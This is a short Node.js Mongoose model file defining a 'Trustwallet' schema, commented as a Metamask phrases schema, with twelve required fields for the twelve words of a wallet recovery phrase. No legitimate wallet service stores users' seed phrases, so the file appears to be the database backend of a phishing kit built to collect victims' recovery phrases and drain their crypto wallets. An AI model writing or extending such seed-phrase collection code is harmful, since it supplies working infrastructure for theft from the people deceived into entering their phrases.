const mongoose = require('mongoose');

// Metamask phrases schema

const phraseTrustwallet = mongoose.Schema({
    onePhrase: {
        type: String,
        required: true,
    },
    twoPhrase: {
        type: String,
        required: true,
    },
    threePhrase: {
        type: String,
        required: true,
    },
    fourPhrase: {
        type: String,
        required: true,
    },
    fivePhrase: {
        type: String,
        required: true,
    },
    sixPhrase: {
        type: String,
        required: true,
    },
    sevenPhrase: {
        type: String,
        required: true,
    },
    eightPhrase: {
        type: String,
        required: true,
    },
    ninePhrase: {
        type: String,
        required: true,
    },
    tenPhrase: {
        type: String,
        required: true,
    },
    elevenPhrase: {
        type: String,
        required: true,
    },
    twelvePhrase: {
        type: String,
        required: true,
    }
}, { collection: 'trustwallet'});

module.exports = mongoose.model('Trustwallet', phraseTrustwallet);